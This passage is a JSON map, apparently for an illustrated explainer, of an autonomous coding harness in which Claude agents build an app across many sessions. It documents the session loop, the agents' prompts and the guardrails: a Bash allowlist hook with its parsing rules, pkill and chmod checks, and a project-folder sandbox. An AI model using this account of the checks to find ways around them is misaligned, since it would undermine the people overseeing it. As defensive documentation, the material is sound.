@@ -1,0 +1,1890 @@
+{
+  "id": "autonomous-coding",
+  "name": "autonomous-coding",
+  "theme": "city",
+  "tagline": "A city where two AI workers build a whole app, one shift at a time",
+  "summary": "A small Python harness that lets Claude build a full web app over many sessions. The first session runs an initializer agent that writes 200 tests into feature_list.json; every later session runs a fresh coding agent that fixes or finishes one feature and leaves notes for the next shift. Every shell command the agents run must pass a security hook with an allowlist, and runs inside a sandbox.",
+  "paths": [
+    "autonomous-coding/autonomous_agent_demo.py",
+    "autonomous-coding/agent.py",
+    "autonomous-coding/client.py",
+    "autonomous-coding/security.py",
+    "autonomous-coding/progress.py",
+    "autonomous-coding/prompts.py",
+    "autonomous-coding/prompts/",
+    "autonomous-coding/test_security.py",
+    "autonomous-coding/requirements.txt"
+  ],
+  "districts": [
+    {
+      "id": "launchpad",
+      "name": "Launch Pad"
+    },
+    {
+      "id": "agents",
+      "name": "Agent Tower"
+    },
+    {
+      "id": "checkpoint",
+      "name": "Security Checkpoint"
+    },
+    {
+      "id": "tools",
+      "name": "Tool Yard"
+    },
+    {
+      "id": "records",
+      "name": "Records Hall"
+    }
+  ],
+  "entities": [
+    {
+      "id": "cli-entry",
+      "kind": "entry",
+      "name": "Start script (CLI)",
+      "district": "launchpad",
+      "summary": "The command you run to start the factory. It reads your options, checks for an API key, and starts the session loop.",
+      "details": "- Options: --project-dir, --max-iterations, --model\n- Default model is claude-sonnet-4-5-20250929\n- Stops right away if ANTHROPIC_API_KEY is not set\n- Relative project folders are moved under generations/\n- Ctrl+C is caught; running the same command again resumes the project",
+      "source": [
+        {
+          "file": "autonomous-coding/autonomous_agent_demo.py",
+          "lines": [
+            75,
+            113
+          ],
+          "anchor": "def main() -> None:"
+        },
+        {
+          "file": "autonomous-coding/autonomous_agent_demo.py",
+          "lines": [
+            24,
+            24
+          ],
+          "anchor": "DEFAULT_MODEL = \"claude-sonnet-4-5-20250929\""
+        }
+      ]
+    },
+    {
+      "id": "session-loop",
+      "kind": "module",
+      "name": "Session loop",
+      "district": "launchpad",
+      "summary": "The shift manager. It runs one agent session after another, each with a brand-new client and an empty memory.",
+      "details": "- First run is decided by one thing: does feature_list.json exist yet?\n- On a first run it copies app_spec.txt into the project\n- Picks the initializer prompt once, then the coding prompt forever after\n- After each session it prints progress and waits 3 seconds\n- On an error it just waits and starts a fresh session",
+      "source": [
+        {
+          "file": "autonomous-coding/agent.py",
+          "lines": [
+            97,
+            186
+          ],
+          "anchor": "async def run_autonomous_agent("
+        },
+        {
+          "file": "autonomous-coding/agent.py",
+          "lines": [
+            124,
+            141
+          ],
+          "anchor": "is_first_run = not tests_file.exists()"
+        }
+      ]
+    },
+    {
+      "id": "max-iterations",
+      "kind": "guardrail",
+      "name": "Iteration limit",
+      "district": "launchpad",
+      "summary": "An optional cap on how many sessions run. Without it the loop runs until you stop it.",
+      "details": "- Set with --max-iterations; default is no limit\n- Checked at the top of every loop turn, before a session starts\n- When hit, it prints a summary and how to run the app",
+      "source": [
+        {
+          "file": "autonomous-coding/agent.py",
+          "lines": [
+            146,
+            153
+          ],
+          "anchor": "if max_iterations and iteration > max_iterations:"
+        },
+        {
+          "file": "autonomous-coding/autonomous_agent_demo.py",
+          "lines": [
+            58,
+            63
+          ],
+          "anchor": "\"--max-iterations\","
+        }
+      ],
+      "guard": {
+        "rule": "Never run more sessions than the user asked for",
+        "checks": "iteration > max_iterations (only when a limit was given)",
+        "onFail": "The loop breaks, a final progress summary is printed and the program ends"
+      }
+    },
+    {
+      "id": "initializer-agent",
+      "kind": "agent",
+      "name": "Initializer agent",
+      "district": "agents",
+      "summary": "The first worker on the site. It reads the app spec and lays the foundation: the test list, a setup script and a git repo.",
+      "details": "- Runs only in session 1\n- Writes feature_list.json with 200+ tests, all marked passes: false\n- Writes init.sh to install and start the app\n- Creates the git repo and the first commit\n- Leaves claude-progress.txt for the next agent",
+      "source": [
+        {
+          "file": "autonomous-coding/agent.py",
+          "lines": [
+            161,
+            164
+          ],
+          "anchor": "prompt = get_initializer_prompt()"
+        },
+        {
+          "file": "autonomous-coding/prompts.py",
+          "lines": [
+            21,
+            23
+          ],
+          "anchor": "def get_initializer_prompt() -> str:"
+        }
+      ],
+      "agent": {
+        "role": "Turns the app spec into a test list, a setup script and a git repo",
+        "model": "claude-sonnet-4-5-20250929",
+        "tools": [
+          "agent-tools",
+          "puppeteer-browser"
+        ],
+        "prompt": "initializer-prompt"
+      }
+    },
+    {
+      "id": "coding-agent",
+      "kind": "agent",
+      "name": "Coding agent",
+      "district": "agents",
+      "summary": "The worker for every later shift. It wakes up with no memory, reads the notes, checks nothing broke, then builds and tests one feature.",
+      "details": "- Starts by reading app_spec.txt, feature_list.json, claude-progress.txt and git log\n- Re-tests 1-2 passing features before new work\n- Picks the top failing feature and builds it\n- Must test through a real browser (Puppeteer)\n- Flips only the \"passes\" field, commits, and updates the notes",
+      "source": [
+        {
+          "file": "autonomous-coding/agent.py",
+          "lines": [
+            165,
+            166
+          ],
+          "anchor": "prompt = get_coding_prompt()"
+        },
+        {
+          "file": "autonomous-coding/prompts/coding_prompt.md",
+          "lines": [
+            1,
+            4
+          ],
+          "anchor": "## YOUR ROLE - CODING AGENT"
+        }
+      ],
+      "agent": {
+        "role": "Builds and browser-tests one feature per session, then commits",
+        "model": "claude-sonnet-4-5-20250929",
+        "tools": [
+          "agent-tools",
+          "puppeteer-browser"
+        ],
+        "prompt": "coding-prompt"
+      }
+    },
+    {
+      "id": "initializer-prompt",
+      "kind": "config",
+      "name": "Initializer prompt and app spec",
+      "district": "agents",
+      "summary": "The written orders for session 1, plus the app spec (a claude.ai clone) that gets copied into the project folder.",
+      "details": "- Demands 200 tests, both functional and style, ordered by priority\n- At least 25 tests must have 10+ steps\n- Says removing or editing tests later is \"catastrophic\"\n- app_spec.txt is copied only if the project does not already have one",
+      "source": [
+        {
+          "file": "autonomous-coding/prompts/initializer_prompt.md",
+          "lines": [
+            1,
+            56
+          ],
+          "anchor": "## YOUR ROLE - INITIALIZER AGENT (Session 1 of Many)"
+        },
+        {
+          "file": "autonomous-coding/prompts.py",
+          "lines": [
+            31,
+            37
+          ],
+          "anchor": "def copy_spec_to_project(project_dir: Path) -> None:"
+        },
+        {
+          "file": "autonomous-coding/prompts/app_spec.txt",
+          "lines": [
+            1,
+            3
+          ],
+          "anchor": "<project_name>Claude.ai Clone - AI Chat Interface</project_name>"
+        }
+      ]
+    },
+    {
+      "id": "coding-prompt",
+      "kind": "config",
+      "name": "Coding prompt",
+      "district": "agents",
+      "summary": "The 10-step routine every coding session follows, from 'get your bearings' to 'end session cleanly'.",
+      "details": "- Step 3: re-check old features before new work\n- Step 6: verify through the real UI, not curl\n- Step 7: may only change the \"passes\" field\n- Steps 8-10: commit, write notes, leave the app working",
+      "source": [
+        {
+          "file": "autonomous-coding/prompts/coding_prompt.md",
+          "lines": [
+            1,
+            197
+          ],
+          "anchor": "### STEP 1: GET YOUR BEARINGS (MANDATORY)"
+        },
+        {
+          "file": "autonomous-coding/prompts/coding_prompt.md",
+          "lines": [
+            106,
+            126
+          ],
+          "anchor": "**YOU CAN ONLY MODIFY ONE FIELD: \"passes\"**"
+        }
+      ]
+    },
+    {
+      "id": "claude-api",
+      "kind": "external",
+      "name": "Claude (via Agent SDK)",
+      "district": "agents",
+      "summary": "The model behind both agents. A new SDK client is made for every session, so each session starts with a clean context.",
+      "details": "- Uses ClaudeSDKClient with max_turns=1000\n- Working folder is the project folder\n- Streams text and tool calls back; the harness prints them\n- Any exception ends the session with status \"error\"",
+      "source": [
+        {
+          "file": "autonomous-coding/client.py",
+          "lines": [
+            102,
+            122
+          ],
+          "anchor": "return ClaudeSDKClient("
+        },
+        {
+          "file": "autonomous-coding/agent.py",
+          "lines": [
+            23,
+            94
+          ],
+          "anchor": "async def run_agent_session("
+        }
+      ]
+    },
+    {
+      "id": "security-hook",
+      "kind": "guardrail",
+      "name": "Bash security hook (allowlist)",
+      "district": "checkpoint",
+      "summary": "A gate that sees every Bash command before it runs. It pulls out each command name and blocks anything not on a short allowlist.",
+      "details": "- Wired in as a PreToolUse hook for the Bash tool only\n- Allowlist: ls, cat, head, tail, wc, grep, cp, mkdir, chmod, pwd, npm, node, git, ps, lsof, sleep, pkill, init.sh\n- Splits on ;, &&, || and | to find every command name\n- If it cannot parse the command at all, it blocks (fail safe)\n- pkill, chmod and init.sh get extra checks",
+      "source": [
+        {
+          "file": "autonomous-coding/security.py",
+          "lines": [
+            297,
+            359
+          ],
+          "anchor": "async def bash_security_hook(input_data, tool_use_id=None, context=None):"
+        },
+        {
+          "file": "autonomous-coding/security.py",
+          "lines": [
+            15,
+            44
+          ],
+          "anchor": "ALLOWED_COMMANDS = {"
+        },
+        {
+          "file": "autonomous-coding/client.py",
+          "lines": [
+            113,
+            117
+          ],
+          "anchor": "HookMatcher(matcher=\"Bash\", hooks=[bash_security_hook]),"
+        }
+      ],
+      "guard": {
+        "rule": "Only allowlisted shell commands may run",
+        "checks": "every name from extract_commands() is in ALLOWED_COMMANDS",
+        "onFail": "Returns {decision: block, reason}; the agent sees the reason instead of output"
+      }
+    },
+    {
+      "id": "pkill-check",
+      "kind": "guardrail",
+      "name": "pkill check",
+      "district": "checkpoint",
+      "summary": "Lets the agent stop its own dev servers, but nothing else.",
+      "details": "- Takes the last non-flag word as the target\n- For -f 'node server.js' it uses the first word, node\n- Allowed targets: node, npm, npx, vite, next",
+      "source": [
+        {
+          "file": "autonomous-coding/security.py",
+          "lines": [
+            161,
+            206
+          ],
+          "anchor": "def validate_pkill_command(command_string: str) -> tuple[bool, str]:"
+        }
+      ],
+      "guard": {
+        "rule": "pkill may only target dev-server processes",
+        "checks": "target in {node, npm, npx, vite, next}",
+        "onFail": "Blocked with 'pkill only allowed for dev processes'"
+      }
+    },
+    {
+      "id": "init-script-checks",
+      "kind": "guardrail",
+      "name": "chmod and init.sh checks",
+      "district": "checkpoint",
+      "summary": "Two small gates for the setup script: chmod may only add +x, and init.sh must be run by path.",
+      "details": "- chmod: no flags, needs a mode and a file, mode must match ^[ugoa]*\\+x$\n- So chmod +x and u+x pass; chmod 777 and chmod -R fail\n- init.sh: first word must be ./init.sh or end with /init.sh\n- A bare 'init.sh' or 'FOO=1 ./init.sh' is blocked",
+      "source": [
+        {
+          "file": "autonomous-coding/security.py",
+          "lines": [
+            209,
+            251
+          ],
+          "anchor": "if not re.match(r\"^[ugoa]*\\+x$\", mode):"
+        },
+        {
+          "file": "autonomous-coding/security.py",
+          "lines": [
+            254,
+            276
+          ],
+          "anchor": "if script == \"./init.sh\" or script.endswith(\"/init.sh\"):"
+        }
+      ],
+      "guard": {
+        "rule": "chmod only makes files executable; only an init.sh path may be run",
+        "checks": "chmod mode matches ^[ugoa]*\\+x$ with no flags; script is ./init.sh or ends with /init.sh",
+        "onFail": "Blocked with a reason like 'chmod only allowed with +x mode, got: 777'"
+      }
+    },
+    {
+      "id": "sandbox-settings",
+      "kind": "guardrail",
+      "name": "Sandbox and permissions",
+      "district": "checkpoint",
+      "summary": "The outer wall. Bash runs in an OS sandbox and file tools may only touch the project folder.",
+      "details": "- Written to .claude_settings.json inside the project each session\n- sandbox.enabled = true\n- File tools allowed only on ./** (the project folder)\n- Bash(*) is allowed here on purpose; the hook does the filtering",
+      "source": [
+        {
+          "file": "autonomous-coding/client.py",
+          "lines": [
+            67,
+            85
+          ],
+          "anchor": "\"sandbox\": {\"enabled\": True, \"autoAllowBashIfSandboxed\": True},"
+        },
+        {
+          "file": "autonomous-coding/client.py",
+          "lines": [
+            90,
+            93
+          ],
+          "anchor": "settings_file = project_dir / \".claude_settings.json\""
+        }
+      ],
+      "guard": {
+        "rule": "Agent actions stay inside the project folder",
+        "checks": "OS sandbox for Bash; Read/Write/Edit/Glob/Grep limited to ./**",
+        "onFail": "The tool call is denied by the SDK, outside this code"
+      }
+    },
+    {
+      "id": "agent-tools",
+      "kind": "skill",
+      "name": "Built-in tools",
+      "district": "tools",
+      "summary": "The hands of the agents: read, write, edit, search files, and run shell commands.",
+      "details": "- Read, Write, Edit, Glob, Grep, Bash\n- Only Bash goes through the security hook\n- File tools are limited by the sandbox permissions",
+      "source": [
+        {
+          "file": "autonomous-coding/client.py",
+          "lines": [
+            30,
+            37
+          ],
+          "anchor": "BUILTIN_TOOLS = ["
+        }
+      ]
+    },
+    {
+      "id": "puppeteer-browser",
+      "kind": "skill",
+      "name": "Puppeteer browser",
+      "district": "tools",
+      "summary": "A real browser the agent drives to test features like a human: click, type, screenshot.",
+      "details": "- Started as an MCP server with npx puppeteer-mcp-server\n- 7 tools: navigate, screenshot, click, fill, select, hover, evaluate\n- The coding prompt says to avoid evaluate shortcuts",
+      "source": [
+        {
+          "file": "autonomous-coding/client.py",
+          "lines": [
+            19,
+            27
+          ],
+          "anchor": "PUPPETEER_TOOLS = ["
+        },
+        {
+          "file": "autonomous-coding/client.py",
+          "lines": [
+            110,
+            112
+          ],
+          "anchor": "\"puppeteer\": {\"command\": \"npx\", \"args\": [\"puppeteer-mcp-server\"]}"
+        }
+      ]
+    },
+    {
+      "id": "feature-list",
+      "kind": "store",
+      "name": "feature_list.json",
+      "district": "records",
+      "summary": "The single source of truth: a list of 200+ tests, each with a passes flag. It also decides if a run is the first one.",
+      "details": "- Written by the initializer, flipped to passes: true by coding agents\n- Its existence switches the loop from initializer to coding mode\n- progress.py counts passing / total for the progress line\n- Missing, broken or empty file all print 'not yet created'",
+      "source": [
+        {
+          "file": "autonomous-coding/progress.py",
+          "lines": [
+            12,
+            36
+          ],
+          "anchor": "passing = sum(1 for test in tests if test.get(\"passes\", False))"
+        },
+        {
+          "file": "autonomous-coding/agent.py",
+          "lines": [
+            125,
+            126
+          ],
+          "anchor": "tests_file = project_dir / \"feature_list.json\""
+        }
+      ]
+    },
+    {
+      "id": "progress-and-git",
+      "kind": "store",
+      "name": "Progress notes and git log",
+      "district": "records",
+      "summary": "The memory between shifts. Since every session forgets everything, agents leave notes in claude-progress.txt and commits in git.",
+      "details": "- claude-progress.txt: what was done, what is next, X/200 passing\n- git: one commit per finished feature\n- The next agent reads both in Step 1",
+      "source": [
+        {
+          "file": "autonomous-coding/prompts/coding_prompt.md",
+          "lines": [
+            128,
+            149
+          ],
+          "anchor": "### STEP 9: UPDATE PROGRESS NOTES"
+        },
+        {
+          "file": "autonomous-coding/prompts/initializer_prompt.md",
+          "lines": [
+            70,
+            77
+          ],
+          "anchor": "### THIRD TASK: Initialize Git"
+        }
+      ]
+    }
+  ],
+  "flows": [
+    {
+      "id": "session-cycle",
+      "name": "A run of the factory",
+      "trigger": "User runs python autonomous_agent_demo.py --project-dir ./my_project",
+      "summary": "The script checks the key, decides if this is a fresh project, then loops: check the limit, pick a prompt, run one session, show progress, repeat.",
+      "start": "s1",
+      "steps": [
+        {
+          "id": "s1",
+          "at": "cli-entry",
+          "action": "Reads options and checks that ANTHROPIC_API_KEY is set",
+          "carries": "{ project_dir: 'generations/my_project', max_iterations: 1 }",
+          "source": {
+            "file": "autonomous-coding/autonomous_agent_demo.py",
+            "lines": [
+              80,
+              85
+            ],
+            "anchor": "if not os.environ.get(\"ANTHROPIC_API_KEY\"):"
+          },
+          "next": [
+            {
+              "to": "s2",
+              "when": "API key is set"
+            },
+            {
+              "to": "outcome:no-key",
+              "when": "API key is missing"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "input",
+                "text": "python autonomous_agent_demo.py --project-dir ./my_project"
+              },
+              {
+                "t": "text",
+                "text": "Nothing is printed yet.",
+                "state": "muted"
+              }
+            ],
+            "note": "The command has just been typed."
+          }
+        },
+        {
+          "id": "s2",
+          "at": "session-loop",
+          "action": "Looks for feature_list.json to set is_first_run; on a fresh project copies app_spec.txt in",
+          "carries": "{ is_first_run: true }",
+          "source": {
+            "file": "autonomous-coding/agent.py",
+            "lines": [
+              124,
+              141
+            ],
+            "anchor": "is_first_run = not tests_file.exists()"
+          },
+          "next": [
+            {
+              "to": "s3",
+              "when": "always"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "console",
+                "items": [
+                  "======================================================================",
+                  "  AUTONOMOUS CODING AGENT DEMO",
+                  "======================================================================",
+                  "Project directory: generations/<project>",
+                  "Model: <model>",
+                  "Max iterations: <n>"
+                ]
+              },
+              {
+                "t": "card",
+                "text": "Then one of",
+                "items": [
+                  "Fresh start - will use initializer agent",
+                  "Continuing existing project"
+                ]
+              },
+              {
+                "t": "card",
+                "text": "On a fresh start only",
+                "items": [
+                  "  NOTE: First session takes 10-20+ minutes!",
+                  "  The agent is generating 200 detailed test cases.",
+                  "  This may appear to hang - it's working. Watch for [Tool: ...] output."
+                ]
+              },
+              {
+                "t": "text",
+                "text": "On an existing project a \"Progress:\" line follows instead of the note.",
+                "state": "muted"
+              }
+            ],
+            "note": "The banner and settings print, then a line saying if this is a fresh start or a continuation."
+          }
+        },
+        {
+          "id": "s3",
+          "at": "max-iterations",
+          "action": "Adds 1 to the iteration count and compares it to the limit",
+          "carries": "{ iteration: 1 }",
+          "source": {
+            "file": "autonomous-coding/agent.py",
+            "lines": [
+              146,
+              153
+            ],
+            "anchor": "if max_iterations and iteration > max_iterations:"
+          },
+          "next": [
+            {
+              "to": "s4",
+              "when": "no limit, or still under it"
+            },
+            {
+              "to": "outcome:stopped",
+              "when": "iteration is over the limit"
+            }
+          ]
+        },
+        {
+          "id": "s4",
+          "at": "session-loop",
+          "action": "Makes a fresh client and picks the prompt; the initializer flag is cleared right after use",
+          "carries": "{ prompt: 'initializer_prompt' | 'coding_prompt' }",
+          "source": {
+            "file": "autonomous-coding/agent.py",
+            "lines": [
+              161,
+              169
+            ],
+            "anchor": "is_first_run = False  # Only use initializer once"
+          },
+          "next": [
+            {
+              "to": "s5",
+              "when": "is_first_run is true"
+            },
+            {
+              "to": "s6",
+              "when": "is_first_run is false"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "======================================================================",
+                  "  SESSION <n>: <INITIALIZER or CODING AGENT>",
+                  "======================================================================"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Created security settings at <path>",
+                  "   - Sandbox enabled (OS-level bash isolation)",
+                  "   - Filesystem restricted to: <project folder>",
+                  "   - Bash commands restricted to allowlist (see security.py)",
+                  "   - MCP servers: puppeteer (browser automation)"
+                ]
+              }
+            ],
+            "note": "A session header names which agent runs, then the safety settings are listed."
+          }
+        },
+        {
+          "id": "s5",
+          "at": "initializer-agent",
+          "action": "Reads the spec, writes 200 tests, init.sh, and the first git commit",
+          "carries": "feature_list.json with 200 x { passes: false }",
+          "source": {
+            "file": "autonomous-coding/prompts/initializer_prompt.md",
+            "lines": [
+              12,
+              17
+            ],
+            "anchor": "### CRITICAL FIRST TASK: Create feature_list.json"
+          },
+          "next": [
+            {
+              "to": "s7",
+              "when": "always"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Sending prompt to Claude Agent SDK...",
+                  "<Claude's text as it streams>",
+                  "[Tool: <tool name>]",
+                  "   Input: <the tool input>"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "   [Done]"
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "The initializer's work scrolls by: its text and each tool it uses."
+          }
+        },
+        {
+          "id": "s6",
+          "at": "coding-agent",
+          "action": "Reads notes, re-tests old features, builds one failing feature, commits",
+          "carries": "one test flipped to { passes: true }",
+          "source": {
+            "file": "autonomous-coding/prompts/coding_prompt.md",
+            "lines": [
+              69,
+              74
+            ],
+            "anchor": "### STEP 4: CHOOSE ONE FEATURE TO IMPLEMENT"
+          },
+          "next": [
+            {
+              "to": "s7",
+              "when": "always"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Sending prompt to Claude Agent SDK...",
+                  "<Claude's text as it streams>",
+                  "[Tool: <tool name>]",
+                  "   Input: <the tool input>"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "   [Done]"
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "The coding agent's work scrolls by: its text and each tool it uses."
+          }
+        },
+        {
+          "id": "s7",
+          "at": "claude-api",
+          "action": "Streams the session until Claude stops; an exception turns into status 'error'",
+          "carries": "{ status: 'continue' | 'error' }",
+          "source": {
+            "file": "autonomous-coding/agent.py",
+            "lines": [
+              168,
+              181
+            ],
+            "anchor": "status, response = await run_agent_session(client, prompt, project_dir)"
+          },
+          "next": [
+            {
+              "to": "s8",
+              "when": "status is 'continue'"
+            },
+            {
+              "to": "s3",
+              "when": "status is 'error' (wait 3s, retry with a fresh session)"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "card",
+                "text": "If the session finished",
+                "items": [
+                  "----------------------------------------------------------------------",
+                  "Agent will auto-continue in 3s..."
+                ],
+                "state": "ok"
+              },
+              {
+                "t": "card",
+                "text": "If the session crashed",
+                "items": [
+                  "Error during agent session: <the error>",
+                  "Session encountered an error",
+                  "Will retry with a fresh session..."
+                ],
+                "state": "error"
+              }
+            ],
+            "note": "The stream ends with a divider line, or with an error line and a promise to retry."
+          }
+        },
+        {
+          "id": "s8",
+          "at": "feature-list",
+          "action": "Counts passing tests and prints 'Progress: X/Y', then waits 3s",
+          "carries": "'Progress: 1/200 tests passing (0.5%)'",
+          "source": {
+            "file": "autonomous-coding/agent.py",
+            "lines": [
+              173,
+              176
+            ],
+            "anchor": "Agent will auto-continue in {AUTO_CONTINUE_DELAY_SECONDS}s..."
+          },
+          "next": [
+            {
+              "to": "s3",
+              "when": "always (next loop turn)"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Agent will auto-continue in 3s...",
+                  "Progress: <passing>/<total> tests passing (<percent>%)"
+                ]
+              },
+              {
+                "t": "text",
+                "text": "\"Preparing next session...\" follows only if more sessions are allowed.",
+                "state": "muted"
+              }
+            ],
+            "note": "A progress line is printed, then a short wait."
+          }
+        }
+      ],
+      "outcomes": [
+        {
+          "id": "no-key",
+          "label": "Exits: API key missing",
+          "kind": "blocked",
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Error: ANTHROPIC_API_KEY environment variable not set",
+                  "Get your API key from: https://console.anthropic.com/",
+                  "Then set it:"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "  export ANTHROPIC_API_KEY='your-api-key-here'"
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "Four lines explain how to set the key, and the program exits."
+          }
+        },
+        {
+          "id": "stopped",
+          "label": "Limit reached, final summary printed",
+          "kind": "success",
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "console",
+                "items": [
+                  "Reached max iterations (<n>)",
+                  "To continue, run the script again without --max-iterations"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "======================================================================",
+                  "  SESSION COMPLETE",
+                  "======================================================================",
+                  "Project directory: generations/<project>",
+                  "Progress: <passing>/<total> tests passing (<percent>%)"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "  TO RUN THE GENERATED APPLICATION:",
+                  "  cd <project folder>",
+                  "  ./init.sh           # Run the setup script",
+                  "  # Or manually:",
+                  "  npm install && npm run dev",
+                  "  Then open http://localhost:3000 (or check init.sh for the URL)"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "Done!"
+                ]
+              }
+            ],
+            "note": "The limit message, a final summary, and how to run the built app are printed."
+          }
+        }
+      ],
+      "cases": [
+        {
+          "id": "c1",
+          "name": "Forgot the API key",
+          "input": "ANTHROPIC_API_KEY unset",
+          "path": [
+            "s1"
+          ],
+          "outcome": "no-key",
+          "explain": "main() prints how to set the key and returns before any session starts.",
+          "brief": "Someone starts the tool without setting an API key first.",
+          "facts": [
+            "API key not set",
+            "any project folder"
+          ]
+        },
+        {
+          "id": "c2",
+          "name": "Brand-new project, one session",
+          "input": "--project-dir ./shop --max-iterations 1, no feature_list.json yet",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s4",
+            "s5",
+            "s7",
+            "s8",
+            "s3"
+          ],
+          "outcome": "stopped",
+          "explain": "No feature_list.json, so the initializer runs. On turn 2, iteration 2 > 1 so the loop stops.",
+          "brief": "A brand-new project is started with room for just one session.",
+          "facts": [
+            "API key set",
+            "no feature list yet",
+            "limit: 1 session",
+            "session finishes cleanly"
+          ]
+        },
+        {
+          "id": "c3",
+          "name": "Resuming a project",
+          "input": "--max-iterations 1, feature_list.json already has 45/200 passing",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s4",
+            "s6",
+            "s7",
+            "s8",
+            "s3"
+          ],
+          "outcome": "stopped",
+          "explain": "The file exists, so is_first_run is false and the coding agent gets the shift.",
+          "brief": "A half-built project is started again with room for one session.",
+          "facts": [
+            "API key set",
+            "feature list exists",
+            "limit: 1 session",
+            "session finishes cleanly"
+          ]
+        },
+        {
+          "id": "c4",
+          "name": "Network drops mid-session",
+          "input": "--max-iterations 1, existing project, client raises an exception",
+          "path": [
+            "s1",
+            "s2",
+            "s3",
+            "s4",
+            "s6",
+            "s7",
+            "s3"
+          ],
+          "outcome": "stopped",
+          "explain": "run_agent_session returns 'error', so no progress line is printed; the loop waits and checks the limit again.",
+          "brief": "A half-built project is started again and the network drops mid-session.",
+          "facts": [
+            "API key set",
+            "feature list exists",
+            "limit: 1 session",
+            "session crashes"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "bash-gate",
+      "name": "A Bash command at the checkpoint",
+      "trigger": "An agent calls the Bash tool",
+      "summary": "Before any shell command runs, the PreToolUse hook parses it, checks every command name against the allowlist, runs extra checks for pkill, chmod and init.sh, and only then lets it into the sandbox.",
+      "start": "s1",
+      "steps": [
+        {
+          "id": "s1",
+          "at": "coding-agent",
+          "action": "Asks to run a shell command with the Bash tool",
+          "carries": "{ tool_name: 'Bash', tool_input: { command: '...' } }",
+          "next": [
+            {
+              "to": "s2",
+              "when": "always"
+            }
+          ],
+          "screen": {
+            "name": "python autonomous_agent_demo.py",
+            "kind": "terminal",
+            "blocks": [
+              {
+                "t": "title",
+                "text": "python autonomous_agent_demo.py"
+              },
+              {
+                "t": "console",
+                "items": [
+                  "[Tool: Bash]"
+                ]
+              },
+              {
+                "t": "console",
+                "items": [
+                  "   Input: {'command': '<the command>'}"
+                ],
+                "state": "active"
+              }
+            ],
+            "note": "The command the agent wants to run is printed."
+          }
+        },
+        {
+          "id": "s2",
+          "at": "security-hook",
+          "action": "Splits the command and pulls out each command name",
+          "carries": "commands: ['chmod', 'init.sh']",
+          "source": {
+            "file": "autonomous-coding/security.py",
+            "lines": [
+              318,
+              329
+            ],
+            "anchor": "commands = extract_commands(command)"
+          },
+          "next": [
+            {
+              "to": "s3",
+              "when": "at least one command name found"
+            },
+            {
+              "to": "outcome:blocked",
+              "when": "could not parse (e.g. unclosed quote)"
+            }
+          ]
+        },
+        {
+          "id": "s3",
+          "at": "security-hook",
+          "action": "Takes the next command name and checks it is on the allowlist",
+          "carries": "cmd: 'chmod'",
+          "source": {
+            "file": "autonomous-coding/security.py",
+            "lines": [
+              331,
+              344
+            ],
+            "anchor": "if cmd not in ALLOWED_COMMANDS:"
+          },
+          "next": [
+            {
+              "to": "outcome:blocked",
+              "when": "name not in ALLOWED_COMMANDS"
+            },
+            {
+              "to": "s4",
+              "when": "name is pkill"
+            },
+            {
+              "to": "s5",
+              "when": "name is chmod"
+            },
+            {
+              "to": "s6",
+              "when": "name is init.sh"
+            },
+            {
+              "to": "s3",
+              "when": "allowed, no extra check, more names left"
+            },
+            {
+              "to": "s7",
+              "when": "allowed, no extra check, last name"
+            }
+          ]
+        },
+        {
+          "id": "s4",
+          "at": "pkill-check",
+          "action": "Finds the pkill target and checks it is a dev process",
+          "carries": "target: 'bash'",
+          "source": {
+            "file": "autonomous-coding/security.py",
+            "lines": [
+              346,
+              349
+            ],
+            "anchor": "allowed, reason = validate_pkill_command(cmd_segment)"
+          },
+          "next": [
+            {
+              "to": "outcome:blocked",
+              "when": "target not node/npm/npx/vite/next"
+            },
+            {
+              "to": "s3",
+              "when": "allowed, more names left"
+            },
+            {
+              "to": "s7",
+              "when": "allowed, last name"
+            }
+          ]
+        },
+        {
+          "id": "s5",
+          "at": "init-script-checks",
+          "action": "Checks chmod has no flags and only adds +x",
+          "carries": "mode: '+x'",
+          "source": {
+            "file": "autonomous-coding/security.py",
+            "lines": [
+              350,
+              353
+            ],
+            "anchor": "allowed, reason = validate_chmod_command(cmd_segment)"
+          },
+          "next": [
+            {
+              "to": "outcome:blocked",
